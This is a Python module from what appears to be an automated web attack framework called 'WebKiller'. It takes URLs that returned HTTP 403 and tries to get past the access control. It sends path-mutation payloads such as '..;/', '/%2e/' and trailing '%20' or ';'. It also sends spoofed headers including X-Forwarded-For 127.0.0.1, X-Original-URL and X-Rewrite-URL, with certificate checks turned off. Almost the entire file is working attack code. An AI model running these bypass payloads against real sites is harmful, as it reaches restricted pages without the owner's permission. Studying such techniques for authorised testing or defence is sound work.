import requests
from urllib.parse import urlparse
from modules.base import BaseModule, ModuleResult


BYPASS_PAYLOADS = [
    lambda p: p + "/.",
    lambda p: p + "/./",
    lambda p: p + "..;/",
    lambda p: "/" + p.lstrip("/").replace("/", "/%2e/"),
    lambda p: p + "%20",
    lambda p: p + "%09",
    lambda p: p + "?",
    lambda p: p + "#",
    lambda p: p + ";",
    lambda p: p.rstrip("/") + "..;/",
]

BYPASS_HEADERS = [
    {"X-Forwarded-For": "127.0.0.1"},
    {"X-Original-URL": "__PATH__"},
    {"X-Rewrite-URL": "__PATH__"},
    {"X-Custom-IP-Authorization": "127.0.0.1"},
    {"X-Forwarded-Host": "localhost"},
    {"X-Host": "localhost"},
]


class Bypass403(BaseModule):
    name = "bypass_403"
    phase = "P6b"
    tools_needed = []

    def execute(self) -> ModuleResult:
        findings_data = self.workspace.read_jsonl("findings.jsonl")
        urls_403 = [f["url"] for f in findings_data if f.get("status_code") == 403]

        hosts_data = self.workspace.read_jsonl("hosts.jsonl")
        urls_403.extend(h["url"] for h in hosts_data if h.get("status_code") == 403)
        urls_403 = list(set(urls_403))[:30]

        if not urls_403:
            return ModuleResult(module=self.name, status="skipped", errors=["No 403 URLs found"])

        confirmed = []
        items = []
        ua = self.config.get("user_agent", "WebKiller/2.0")

        for url in urls_403:
            parsed = urlparse(url)
            path = parsed.path

            for payload_fn in BYPASS_PAYLOADS:
                try_path = payload_fn(path)
                try_url = f"{parsed.scheme}://{parsed.netloc}{try_path}"
                try:
                    resp = requests.get(try_url, headers={"User-Agent": ua},
                                        timeout=10, verify=False, allow_redirects=False)
                    if resp.status_code == 200:
                        confirmed.append({
                            "url": try_url,
                            "original_url": url,
                            "vuln_class": "403_bypass",
                            "severity": "medium",
                            "method": "path_traversal",
                            "evidence": {"bypass_path": try_path, "status": 200},
                        })
                        items.append(f"[403-BYPASS] {url} → {try_path}")
                        break
                except Exception:
                    continue

            for hdr_set in BYPASS_HEADERS:
                headers = {"User-Agent": ua}
                for k, v in hdr_set.items():
                    headers[k] = v.replace("__PATH__", path)
                try:
                    resp = requests.get(url, headers=headers, timeout=10, verify=False, allow_redirects=False)
                    if resp.status_code == 200:
                        confirmed.append({
                            "url": url,
                            "vuln_class": "403_bypass",
                            "severity": "medium",
                            "method": "header_injection",
                            "evidence": {"header": list(hdr_set.keys())[0], "status": 200},
                        })
                        items.append(f"[403-BYPASS] {url} via {list(hdr_set.keys())[0]}")
                        break
                except Exception:
                    continue

        self.workspace.append_jsonl("confirmed.jsonl", confirmed)
        return ModuleResult(module=self.name, items=items, records=confirmed, tool_used="python-bypass")
